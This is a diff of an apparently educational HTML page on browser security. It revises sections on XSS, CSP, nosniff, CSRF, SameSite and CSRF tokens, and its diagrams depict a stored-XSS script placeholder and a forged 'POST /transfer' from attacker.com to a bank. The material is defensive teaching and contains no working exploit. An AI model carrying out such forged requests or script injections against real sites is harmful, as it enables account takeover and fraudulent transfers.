@@ -32,13 +32,11 @@
     max-width: var(--content-w);
   }
   .header-block .hl-name  { color: var(--teal); }
-  .header-block .hl-value { color: #c9d1d9; }
+  .header-block .hl-value { color: var(--text-body); }
   .header-block .hl-comment { color: var(--text-faint); font-style: italic; }
 </style>
 </head>
 <body>
-
-<div class="progress-bar" id="progress"></div>
 
 <header class="mobile-header">
   <a class="mobile-logo" href="index.html">Single Threaded <span>— Docs</span></a>
@@ -54,12 +52,14 @@
   <div class="sidebar-section">Attacks &amp; Defenses</div>
   <a href="#xss">XSS</a>
   <a href="#csrf">CSRF</a>
+  <a href="#same-origin-cors">Same-Origin Policy &amp; CORS</a>
   <a href="#clickjacking">Clickjacking</a>
   <a href="#hsts">Protocol Downgrade</a>
   <div class="sidebar-section">Additional Controls</div>
   <a href="#sri">Supply Chain Attacks</a>
   <a href="#leakage">Information Leakage</a>
   <div class="sidebar-section">Reference</div>
+  <a href="#scenarios">Attack Scenarios</a>
   <a href="#header-summary">Header Summary</a>
 </nav>
 
@@ -67,10 +67,10 @@
 
   <div class="eyebrow">Security · Browser</div>
   <h1>Browser Security: <em>Attacks and Defenses</em></h1>
-  <p class="subtitle">XSS, CSRF, clickjacking, and the HTTP headers that defend against them. Understanding how each attack works makes the defenses obvious.</p>
+  <p class="subtitle">XSS, CSRF, clickjacking, and the HTTP headers that defend against them.</p>
   <div class="byline">
     <strong>Deep dive</strong>
-    <div class="dot"></div><span>~18 min read</span>
+    <div class="dot"></div><span>~14 min read</span>
     <div class="dot"></div><span>Browser security</span>
     <div class="dot"></div><span>June 2026</span>
   </div>
@@ -79,65 +79,70 @@
 
   <!-- ══════════════════════════════════════════════════ -->
   <h2 id="xss">Cross-Site Scripting (XSS)</h2>
-  <p class="lede">XSS lets an attacker inject JavaScript into a page viewed by other users. Once running in a victim's browser, that script has the same capabilities as any legitimate script on the page.</p>
+  <p class="lede">Cross-Site Scripting (XSS) is an injection attack where malicious JavaScript is injected to a web page trusted by other users. Once running in a victim's browser, that script has the same capabilities as any legitimate script on the page.</p>
 
   <h3>How it works</h3>
-  <p>XSS occurs when an application takes untrusted data (from a user, a URL, a database) and outputs it into a page without escaping it. The browser then parses that data as markup and executes it.</p>
+  <p>The "cross-site" part of the name refers to where the code comes from, not where it runs. The script is authored by the attacker, someone with no legitimate reason to run code on the site at all, but the browser ends up executing it inside the site's own origin, with the same access to cookies, the DOM, and API calls as code the site actually wrote itself.</p>
+  <p>This happens when an application takes untrusted data (from a user, a URL, a database) and outputs it into a page without escaping it. The browser then parses that data as markup and executes it.</p>
 
-  <p>There are three main forms. <strong>Stored XSS</strong> is the most severe: the malicious payload is saved to the database (in a comment, a profile name, a message) and injected into the page for every user who views it. <strong>Reflected XSS</strong> is delivered via a crafted URL; the server reflects the payload back in the response without storing it, and the attack typically requires tricking a victim into clicking a link. <strong>DOM-based XSS</strong> never reaches the server. The vulnerability is in client-side JavaScript that unsafely writes URL parameters or user input into the DOM.</p>
+  <p>There are three main forms, and they differ in where the unsafe step actually happens. <strong>Stored XSS</strong> is the most severe. The malicious payload is saved to the database (in a comment, a profile name, a message) and gets served to every user who views that page.</p>
+
+  <p><strong>Reflected XSS</strong> also involves the server, but nothing is saved. A crafted URL carries the payload as a query parameter, the server reads that parameter and writes it straight into the HTML it sends back (a search page that echoes "You searched for: ..." is the classic case), and the browser parses it as markup because the server never escaped it. Since the server put the payload into the response, viewing the page's source shows the injected script sitting right there in the HTML. The attack still needs a victim to click the crafted link, since the payload only exists for that one request.</p>
+
+  <p><strong>DOM-based XSS</strong> never touches the server at all. The HTML the server sends back is identical for every visitor, and its source shows nothing unusual. The payload lives in the URL, often after a <code>#</code>, which browsers never even send to the server, and it's the page's own JavaScript that reads it (with something like <code>location.hash</code>) and writes it into the DOM (with <code>innerHTML</code> or a similar sink) without escaping it. The bug is entirely in client-side code, not in anything the server rendered.</p>
 
   <p>What an attacker can do once JavaScript is executing in the victim's browser: read cookies (unless HttpOnly prevents it), steal tokens from localStorage, make authenticated API requests as the user, log every keystroke, redirect to a phishing page, or silently modify page content.</p>
 
   <figure style="margin:24px 0 8px;">
-    <svg viewBox="0 0 700 175" style="max-width:100%;display:block;background:#161b22;border:1px solid #30363d;border-radius:8px;" role="img" aria-label="Stored XSS attack flow diagram showing payload travelling from Attacker through Server Database to Victim Browser" xmlns="http://www.w3.org/2000/svg">
+    <svg viewBox="0 0 700 175" style="max-width:100%;display:block;background:var(--surface);border:1px solid var(--border);border-radius:8px;" role="img" aria-label="Stored XSS attack flow diagram showing payload travelling from Attacker through Server Database to Victim Browser" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <marker id="bs-r" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
-          <polygon points="0 0, 8 3, 0 6" fill="#8b94a0"/>
+          <polygon points="0 0, 8 3, 0 6" fill="var(--text-dim)"/>
         </marker>
         <marker id="bs-rr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
-          <polygon points="0 0, 8 3, 0 6" fill="#f85149"/>
+          <polygon points="0 0, 8 3, 0 6" fill="var(--red)"/>
         </marker>
       </defs>
       <!-- Title -->
-      <text x="350" y="14" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="#8b94a0" letter-spacing="0.04em">Stored XSS &#8212; How the payload travels</text>
+      <text x="350" y="14" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="var(--text-dim)" letter-spacing="0.04em">How the payload travels in stored XSS</text>
       <!-- Actor boxes -->
-      <rect x="10" y="22" width="160" height="32" rx="6" fill="#1c2330" stroke="#f85149" stroke-width="1.5"/>
-      <text x="90" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#e6edf3">Attacker</text>
-      <rect x="265" y="22" width="170" height="32" rx="6" fill="#1c2330" stroke="#30363d" stroke-width="1.5"/>
-      <text x="350" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#e6edf3">Server / Database</text>
-      <rect x="530" y="22" width="160" height="32" rx="6" fill="#1c2330" stroke="#30363d" stroke-width="1.5"/>
-      <text x="610" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#e6edf3">Victim&#39;s Browser</text>
+      <rect x="10" y="22" width="160" height="32" rx="6" fill="var(--surface-2)" stroke="var(--red)" stroke-width="1.5"/>
+      <text x="90" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--text)">Attacker</text>
+      <rect x="265" y="22" width="170" height="32" rx="6" fill="var(--surface-2)" stroke="var(--border)" stroke-width="1.5"/>
+      <text x="350" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--text)">Server / Database</text>
+      <rect x="530" y="22" width="160" height="32" rx="6" fill="var(--surface-2)" stroke="var(--border)" stroke-width="1.5"/>
+      <text x="610" y="43" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--text)">Victim&#39;s Browser</text>
       <!-- Content boxes -->
-      <rect x="10" y="62" width="160" height="56" rx="5" fill="rgba(248,81,73,0.07)" stroke="rgba(248,81,73,0.25)" stroke-width="1"/>
-      <text x="90" y="83" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="#f85149">&lt;script&gt;...&lt;/script&gt;</text>
-      <text x="90" y="100" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">Posts malicious comment</text>
-      <text x="90" y="113" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">or review</text>
-      <rect x="265" y="62" width="170" height="56" rx="5" fill="rgba(139,148,160,0.07)" stroke="rgba(139,148,160,0.2)" stroke-width="1"/>
-      <text x="350" y="83" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">Stores payload in database</text>
-      <text x="350" y="100" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">unescaped</text>
-      <rect x="530" y="62" width="160" height="56" rx="5" fill="rgba(139,148,160,0.07)" stroke="rgba(139,148,160,0.2)" stroke-width="1"/>
-      <text x="610" y="80" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">Every viewer loads the page</text>
-      <text x="610" y="96" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">&#8594; script executes in</text>
-      <text x="610" y="112" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">their session</text>
+      <rect x="10" y="62" width="160" height="56" rx="5" fill="color-mix(in srgb, var(--red) 7%, transparent)" stroke="color-mix(in srgb, var(--red) 25%, transparent)" stroke-width="1"/>
+      <text x="90" y="83" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="var(--red)">&lt;script&gt;...&lt;/script&gt;</text>
+      <text x="90" y="100" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">Posts malicious comment</text>
+      <text x="90" y="113" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">or review</text>
+      <rect x="265" y="62" width="170" height="56" rx="5" fill="color-mix(in srgb, var(--text-dim) 7%, transparent)" stroke="color-mix(in srgb, var(--text-dim) 20%, transparent)" stroke-width="1"/>
+      <text x="350" y="83" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">Stores payload in database</text>
+      <text x="350" y="100" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">unescaped</text>
+      <rect x="530" y="62" width="160" height="56" rx="5" fill="color-mix(in srgb, var(--text-dim) 7%, transparent)" stroke="color-mix(in srgb, var(--text-dim) 20%, transparent)" stroke-width="1"/>
+      <text x="610" y="80" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">Every viewer loads the page</text>
+      <text x="610" y="96" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">&#8594; script executes in</text>
+      <text x="610" y="112" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">their session</text>
       <!-- Arrows between content boxes -->
-      <line x1="172" y1="90" x2="262" y2="90" stroke="#8b94a0" stroke-width="1.5" marker-end="url(#bs-r)"/>
-      <line x1="437" y1="90" x2="527" y2="90" stroke="#f85149" stroke-width="1.5" marker-end="url(#bs-rr)"/>
+      <line x1="172" y1="90" x2="262" y2="90" stroke="var(--text-dim)" stroke-width="1.5" marker-end="url(#bs-r)"/>
+      <line x1="437" y1="90" x2="527" y2="90" stroke="var(--red)" stroke-width="1.5" marker-end="url(#bs-rr)"/>
       <!-- Footer note -->
-      <text x="610" y="140" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="#f85149">steal cookies &#183; exfiltrate tokens</text>
-      <text x="610" y="154" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="#f85149">make API calls as the user</text>
+      <text x="610" y="140" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="var(--red)">steal cookies &#183; exfiltrate tokens</text>
+      <text x="610" y="154" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="var(--red)">make API calls as the user</text>
     </svg>
-    <figcaption style="font-size:13px;color:#8b94a0;margin-top:8px;line-height:1.5;">The payload is injected once but executes for every user who views the page &#8212; including admins.</figcaption>
+    <figcaption style="font-size:13px;color:var(--text-dim);margin-top:8px;line-height:1.5;">The payload is injected once but executes for every user who views the page.</figcaption>
   </figure>
 
   <h3>Defenses</h3>
-  <p>The primary defense is <strong>output encoding</strong>: any untrusted data inserted into HTML must be escaped so that it cannot be interpreted as markup. The characters that matter most are <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, and <code>'</code>: escaped, these become <code>&amp;lt;</code>, <code>&amp;gt;</code>, and so on. Modern frontend frameworks (React, Vue, Angular, Svelte) escape output by default. The danger is bypassing these protections deliberately (<code>dangerouslySetInnerHTML</code> in React, <code>v-html</code> in Vue, or raw <code>innerHTML</code> in vanilla JavaScript) without first sanitizing the input through a trusted library like DOMPurify.</p>
+  <p>The primary defense is <strong>output encoding</strong>. Any untrusted data inserted into HTML must be escaped so that it cannot be interpreted as markup. The characters that matter most are <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, and <code>'</code>: escaped, these become <code>&amp;lt;</code>, <code>&amp;gt;</code>, and so on. Modern frontend frameworks (React, Vue, Angular, Svelte) escape output by default. The danger is bypassing these protections deliberately (<code>dangerouslySetInnerHTML</code> in React, <code>v-html</code> in Vue, or raw <code>innerHTML</code> in vanilla JavaScript) without first sanitizing the input through a trusted library like DOMPurify.</p>
 
   <p><strong>HttpOnly cookies</strong> don't prevent XSS but meaningfully limit its impact. A cookie marked HttpOnly is not accessible to JavaScript. <code>document.cookie</code> won't include it. This means an XSS payload cannot steal session tokens stored in HttpOnly cookies, which removes the most common goal of XSS attacks. This is why session cookies should always be HttpOnly.</p>
 
-  <p><strong>Content Security Policy (CSP)</strong> is a response header that tells the browser which content sources are legitimate. It is a second line of defense: it does not fix the underlying vulnerability, but it can prevent an injected script from executing or exfiltrating data.</p>
+  <p><strong>Content Security Policy (CSP)</strong> is a response header that tells the browser which content sources are legitimate. It is a second line of defense. It does not fix the underlying vulnerability, but it can prevent an injected script from executing or exfiltrating data.</p>
 
   <div class="header-block">
-    <div><span class="hl-comment"># Only allow scripts from the same origin — no inline scripts</span></div>
+    <div><span class="hl-comment"># Only allow scripts from the same origin, not inline scripts</span></div>
     <div><span class="hl-name">Content-Security-Policy:</span> <span class="hl-value">script-src 'self'</span></div>
     <div>&nbsp;</div>
     <div><span class="hl-comment"># Allow scripts from self and a CDN</span></div>
@@ -147,9 +152,9 @@
     <div><span class="hl-name">Content-Security-Policy:</span> <span class="hl-value">script-src 'self' 'nonce-r4nd0m9x'</span></div>
   </div>
 
-  <p>A <strong>nonce</strong> is a random value generated per response and added to both the CSP header and any inline <code>&lt;script&gt;</code> tags you control. The browser only executes inline scripts whose nonce matches. An injected script has no nonce, so even if XSS occurs, the script is blocked. Nonces must be genuinely random and must change on every response. A predictable or reused nonce is no protection.</p>
+  <p>A <strong>nonce</strong> is a random value generated per response and added to both the CSP header and any inline <code>&lt;script&gt;</code> tags on the page. The browser only executes inline scripts whose nonce matches. An injected script has no nonce, so even if XSS occurs, the script is blocked. Nonces must be genuinely random and must change on every response. A predictable or reused nonce is no protection.</p>
 
-  <p><strong>X-Content-Type-Options: nosniff</strong> prevents the browser from guessing content types. Without it, a browser might execute a response as JavaScript if the content looks like a script, even if the server declared it as a different type. This closes a subtle XSS vector where an attacker uploads a file that looks like JavaScript and tricks the browser into executing it.</p>
+  <p><strong>X-Content-Type-Options: nosniff</strong> prevents browsers from interpreting a response as a different content type than what the server declared. Modern browsers already enforce strict MIME type checking for script execution, so this header is defense-in-depth rather than a primary control. It still earns its place since it prevents browsers from treating downloaded files as HTML, closes content-type confusion on some less common resource types, and signals a deliberate security posture to scanning tools and intermediaries.</p>
 
   <div class="header-block">
     <div><span class="hl-name">X-Content-Type-Options:</span> <span class="hl-value">nosniff</span></div>
@@ -157,7 +162,7 @@
 
   <div class="callout info">
     <div class="callout-title">CSP in report-only mode</div>
-    <p>Deploying a new CSP policy can break legitimate functionality if you've missed an allowed source. <code>Content-Security-Policy-Report-Only</code> sends the same policy but only reports violations instead of blocking them, letting you audit the impact before enforcement. Pair it with a <code>report-uri</code> or <code>report-to</code> directive to collect violations in your logging infrastructure.</p>
+    <p>Deploying a new CSP policy can break legitimate functionality if an allowed source gets missed. <code>Content-Security-Policy-Report-Only</code> sends the same policy but only reports violations instead of blocking them. Pair it with a <code>report-uri</code> or <code>report-to</code> directive to collect violations in the site's logging infrastructure.</p>
   </div>
 
   <!-- ══════════════════════════════════════════════════ -->
@@ -165,73 +170,72 @@
   <p class="lede">CSRF exploits the browser's automatic cookie behavior to make authenticated requests on a victim's behalf, without the victim knowing.</p>
 
   <h3>How it works</h3>
-  <p>Browsers automatically attach cookies to every request sent to an origin, regardless of where that request originates. This means a page on <code>attacker.com</code> can trigger a request to <code>bank.com</code>, and the browser will include the victim's <code>bank.com</code> session cookie. If the bank's server sees a valid session cookie, it processes the request (the transfer, the password change, the data deletion) without any indication that it came from a third-party page.</p>
+  <p>CSRF attacks target sites whose session cookie gets attached to a request no matter where that request came from. An evil site can make a browser send a request to the vulnerable site, and it arrives with a session cookie attached. The vulnerable site's server sees a valid session and processes the request with no way to tell it didn't come from the actual account holder.</p>
 
   <div class="callout warn">
-    <div class="callout-title">A classic example</div>
-    <p>A user is logged into their bank. They visit a page containing a hidden form that points to <code>https://bank.com/transfer</code> with the attacker's account as the recipient. The form submits automatically on page load. The bank receives a POST with the user's session cookie and processes the transfer. The user never saw a form.</p>
+    <div class="callout-title">CSRF and Same-Origin Policy</div>
+    <p>CSRF only works for state-changing operations (POST, PUT, DELETE). The Same-Origin Policy prevents the attacker's page from reading the vulnerable site's response, so it can't steal data this way, only trigger an action.</p>
   </div>
 
-  <p>CSRF only works for state-changing operations (POST, PUT, DELETE). The same-origin policy prevents the attacker's page from reading the response, so it can't steal data, only trigger actions.</p>
 
   <figure style="margin:24px 0 8px;">
-    <svg viewBox="0 0 700 270" style="max-width:100%;display:block;background:#161b22;border:1px solid #30363d;border-radius:8px;" role="img" aria-label="CSRF attack flow sequence diagram showing browser as unwitting messenger between attacker.com and bank.com" xmlns="http://www.w3.org/2000/svg">
+    <svg viewBox="0 0 700 270" style="max-width:100%;display:block;background:var(--surface);border:1px solid var(--border);border-radius:8px;" role="img" aria-label="CSRF attack flow sequence diagram showing browser as unwitting messenger between attacker.com and bank.com" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <marker id="bs-lb" markerWidth="8" markerHeight="6" refX="0" refY="3" orient="auto">
-          <polygon points="8 0, 0 3, 8 6" fill="#58a6ff"/>
+          <polygon points="8 0, 0 3, 8 6" fill="var(--accent)"/>
         </marker>
         <marker id="bs-rr2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
-          <polygon points="0 0, 8 3, 0 6" fill="#f85149"/>
+          <polygon points="0 0, 8 3, 0 6" fill="var(--red)"/>
         </marker>
         <marker id="bs-rd" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
-          <polygon points="0 0, 8 3, 0 6" fill="#8b94a0"/>
+          <polygon points="0 0, 8 3, 0 6" fill="var(--text-dim)"/>
         </marker>
         <marker id="bs-rr3" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
-          <polygon points="0 0, 8 3, 0 6" fill="#8b94a0"/>
+          <polygon points="0 0, 8 3, 0 6" fill="var(--text-dim)"/>
         </marker>
       </defs>
       <!-- Title -->
-      <text x="350" y="18" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="#8b94a0" letter-spacing="0.04em">CSRF &#8212; The Browser as Unwitting Messenger</text>
+      <text x="350" y="18" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="11" fill="var(--text-dim)" letter-spacing="0.04em">CSRF</text>
       <!-- Actor boxes -->
-      <rect x="10" y="28" width="160" height="32" rx="6" fill="#1c2330" stroke="#30363d" stroke-width="1.5"/>
-      <text x="90" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#e6edf3">Victim&#39;s Browser</text>
-      <rect x="265" y="28" width="170" height="32" rx="6" fill="#1c2330" stroke="#f85149" stroke-width="1.5"/>
-      <text x="350" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#f85149">attacker.com</text>
-      <rect x="530" y="28" width="160" height="32" rx="6" fill="#1c2330" stroke="#30363d" stroke-width="1.5"/>
-      <text x="610" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="#e6edf3">bank.com</text>
+      <rect x="10" y="28" width="160" height="32" rx="6" fill="var(--surface-2)" stroke="var(--border)" stroke-width="1.5"/>
+      <text x="90" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--text)">Victim&#39;s Browser</text>
+      <rect x="265" y="28" width="170" height="32" rx="6" fill="var(--surface-2)" stroke="var(--red)" stroke-width="1.5"/>
+      <text x="350" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--red)">attacker.com</text>
+      <rect x="530" y="28" width="160" height="32" rx="6" fill="var(--surface-2)" stroke="var(--border)" stroke-width="1.5"/>
+      <text x="610" y="49" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="12" font-weight="600" fill="var(--text)">bank.com</text>
       <!-- Lifelines -->
-      <line x1="90" y1="60" x2="90" y2="250" stroke="#30363d" stroke-width="1" stroke-dasharray="4,3"/>
-      <line x1="350" y1="60" x2="350" y2="250" stroke="#30363d" stroke-width="1" stroke-dasharray="4,3"/>
-      <line x1="610" y1="60" x2="610" y2="250" stroke="#30363d" stroke-width="1" stroke-dasharray="4,3"/>
+      <line x1="90" y1="60" x2="90" y2="250" stroke="var(--border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <line x1="350" y1="60" x2="350" y2="250" stroke="var(--border)" stroke-width="1" stroke-dasharray="4,3"/>
+      <line x1="610" y1="60" x2="610" y2="250" stroke="var(--border)" stroke-width="1" stroke-dasharray="4,3"/>
       <!-- Step: Previously logged in (dashed) -->
-      <line x1="602" y1="82" x2="98" y2="82" stroke="#8b94a0" stroke-width="1" stroke-dasharray="5,3" marker-end="url(#bs-rd)"/>
-      <text x="350" y="78" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="10.5" fill="#5f6c8c">Previously: User logged in, session cookie set</text>
+      <line x1="602" y1="82" x2="98" y2="82" stroke="var(--text-dim)" stroke-width="1" stroke-dasharray="5,3" marker-end="url(#bs-rd)"/>
+      <text x="350" y="78" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="10.5" fill="var(--text-faint)">Previously: User logged in, session cookie set</text>
       <!-- Step: User visits attacker page -->
-      <line x1="98" y1="112" x2="342" y2="112" stroke="#8b94a0" stroke-width="1.5" marker-end="url(#bs-rr3)"/>
-      <text x="220" y="108" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="#8b94a0">User visits attacker&#39;s page</text>
+      <line x1="98" y1="112" x2="342" y2="112" stroke="var(--text-dim)" stroke-width="1.5" marker-end="url(#bs-rr3)"/>
+      <text x="220" y="108" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" fill="var(--text-dim)">User visits attacker&#39;s page</text>
       <!-- Annotation on attacker.com -->
-      <rect x="267" y="121" width="166" height="28" rx="4" fill="rgba(248,81,73,0.08)" stroke="rgba(248,81,73,0.25)" stroke-width="1"/>
-      <text x="350" y="133" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="#f85149">Hidden form auto-submits</text>
-      <text x="350" y="144" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="#f85149">to bank.com on page load</text>
+      <rect x="267" y="121" width="166" height="28" rx="4" fill="color-mix(in srgb, var(--red) 8%, transparent)" stroke="color-mix(in srgb, var(--red) 25%, transparent)" stroke-width="1"/>
+      <text x="350" y="133" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="var(--red)">Hidden form auto-submits</text>
+      <text x="350" y="144" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="var(--red)">to bank.com on page load</text>
       <!-- Step: POST to bank.com (red = dangerous) -->
-      <line x1="98" y1="168" x2="602" y2="168" stroke="#f85149" stroke-width="2" marker-end="url(#bs-rr2)"/>
-      <text x="350" y="163" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" font-weight="600" fill="#f85149">POST /transfer &#123;amount=1000, to=attacker&#125;</text>
-      <text x="350" y="180" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="#d29922">Browser auto-attaches session cookie!</text>
+      <line x1="98" y1="168" x2="602" y2="168" stroke="var(--red)" stroke-width="2" marker-end="url(#bs-rr2)"/>
+      <text x="350" y="163" text-anchor="middle" font-family="'Inter',system-ui,sans-serif" font-size="11" font-weight="600" fill="var(--red)">POST /transfer &#123;amount=1000, to=attacker&#125;</text>
+      <text x="350" y="180" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="var(--orange)">Browser auto-attaches session cookie!</text>
       <!-- Annotation on bank.com -->
-      <rect x="533" y="188" width="156" height="28" rx="4" fill="rgba(248,81,73,0.08)" stroke="rgba(248,81,73,0.2)" stroke-width="1"/>
-      <text x="611" y="200" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="#8b94a0">Sees valid session cookie</text>
-      <text x="611" y="211" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="#f85149">&#8594; processes transfer</text>
+      <rect x="533" y="188" width="156" height="28" rx="4" fill="color-mix(in srgb, var(--red) 8%, transparent)" stroke="color-mix(in srgb, var(--red) 20%, transparent)" stroke-width="1"/>
+      <text x="611" y="200" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="var(--text-dim)">Sees valid session cookie</text>
+      <text x="611" y="211" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="9.5" fill="var(--red)">&#8594; processes transfer</text>
       <!-- Bottom insight label -->
-      <rect x="20" y="232" width="660" height="24" rx="4" fill="rgba(139,148,160,0.06)" stroke="rgba(139,148,160,0.15)" stroke-width="1"/>
-      <text x="350" y="248" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="#5f6c8c">The browser is the messenger &#8212; bank.com can&#39;t tell the request came from attacker.com</text>
+      <rect x="20" y="232" width="660" height="24" rx="4" fill="color-mix(in srgb, var(--text-dim) 6%, transparent)" stroke="color-mix(in srgb, var(--text-dim) 15%, transparent)" stroke-width="1"/>
+      <text x="350" y="248" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="10" fill="var(--text-faint)">bank.com can&#39;t tell the request came from attacker.com</text>
     </svg>
-    <figcaption style="font-size:13px;color:#8b94a0;margin-top:8px;line-height:1.5;">The browser doesn&#39;t know the request is malicious &#8212; it just sees a valid destination and attaches the cookie automatically.</figcaption>
+    <figcaption style="font-size:13px;color:var(--text-dim);margin-top:8px;line-height:1.5;">The browser doesn&#39;t know the request is malicious. It just sees a valid destination and attaches the cookie automatically.</figcaption>
   </figure>
 
   <h3>Defenses</h3>
-  <p>The modern defense is the <strong>SameSite cookie attribute</strong>, covered in depth in the <a href="http.html">HTTP article</a>. With <code>SameSite=Strict</code>, session cookies are never sent on cross-site requests. The browser simply won't attach them. <code>SameSite=Lax</code> (the browser default since around 2020) blocks cookies on cross-site subrequests like form submissions and XHR, but allows them on top-level navigations. Either setting prevents the classic CSRF scenario above.</p>
+  <p>The modern defense is the <strong>SameSite cookie attribute</strong>, covered in depth in the <a href="http.html">HTTP article</a>. With <code>SameSite=Strict</code>, the session cookie is never sent on a cross-site request. <code>SameSite=Lax</code> (the browser default since around 2020) sends the cookie only on a cross-site request that's both a top-level navigation and uses a safe method, an ordinary link click being the common case. The hidden form in the classic example above submits as a POST, which isn't a safe method, so Lax withholds the cookie there too, exactly like Strict. Either setting works by keeping the cookie from ever reaching the server. The bank sees a request with no valid session at all, forged or not.</p>
 
-  <p><strong>CSRF tokens</strong> are the traditional defense and remain necessary when cookie-based auth is used on older browsers or when <code>SameSite</code> cannot be relied on. The server embeds a unique, unpredictable token in each form or response. Every state-changing request must include this token. Because the attacker's page cannot read content from the victim's origin (same-origin policy), it cannot obtain the token and therefore cannot forge a valid request.</p>
+  <p><strong>CSRF tokens</strong> defend against the same attack as SameSite, just at a different layer, which is why sites commonly use both instead of relying on either alone. SameSite is a single point of protection. If it's ever misconfigured, disabled, unsupported by an older client, needs to be <code>SameSite=None</code> for a legitimate cross-origin integration, or simply doesn't apply because the request came from a same-site subdomain the application doesn't fully trust, a forged request can still arrive with the session cookie attached, and nothing about the cookie itself stops it. CSRF tokens are the independent backstop for exactly that case. The server embeds a second, unique, unpredictable value into each form or response and rejects any state-changing request that doesn't include a matching one. Even if a forged request from evilsite.com does arrive with the victim's session cookie, because SameSite failed to stop it, evilsite.com's page was never able to read bank.com's page in the first place, so it never saw the token and has no way to include it. The request still fails, on the token alone.</p>
 
   <div class="attack-defense">
     <div class="card red">
@@ -242,8 +246,35 @@
     <div class="card teal">
       <div class="card-label">Defense</div>
       <div class="card-title">What stops it</div>
-      <p><code>SameSite=Strict</code> or <code>Lax</code> cookies are not sent on cross-site requests, so the session cookie never arrives. CSRF tokens verify the request originated from a page the server rendered.</p>
+      <p><code>SameSite=Strict</code> or <code>Lax</code> cookies aren't sent on a cross-site POST like this one, so the session cookie never arrives. CSRF tokens verify the request originated from a page the server rendered.</p>
     </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════ -->
+  <h2 id="same-origin-cors">Same-Origin Policy and CORS</h2>
+  <p class="lede">The same-origin policy is the browser's default-deny rule for reading across origins. CORS is how a server opts specific origins back in.</p>
+
+  <h3>What it protects against</h3>
